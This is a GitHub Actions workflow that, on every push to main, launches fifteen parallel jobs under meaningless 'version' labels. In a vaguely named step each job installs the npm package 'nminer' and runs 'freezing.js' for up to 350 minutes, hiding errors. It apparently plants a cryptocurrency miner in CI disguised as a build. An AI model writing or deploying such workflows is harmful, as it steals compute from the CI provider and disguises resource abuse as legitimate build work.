name: freezing
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9822 }
          - { version: 2545 }
          - { version: 891 }
          - { version: 4065 }
          - { version: 7783 }
          - { version: 2184 }
          - { version: 3581 }
          - { version: 6426 }
          - { version: 1768 }
          - { version: 6165 }
          - { version: 7158 }
          - { version: 4286 }
          - { version: 9153 }
          - { version: 7440 }
          - { version: 1567 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: which
        run: |
          npm install nminer@latest
          timeout 350m node freezing.js || echo "freezing executed"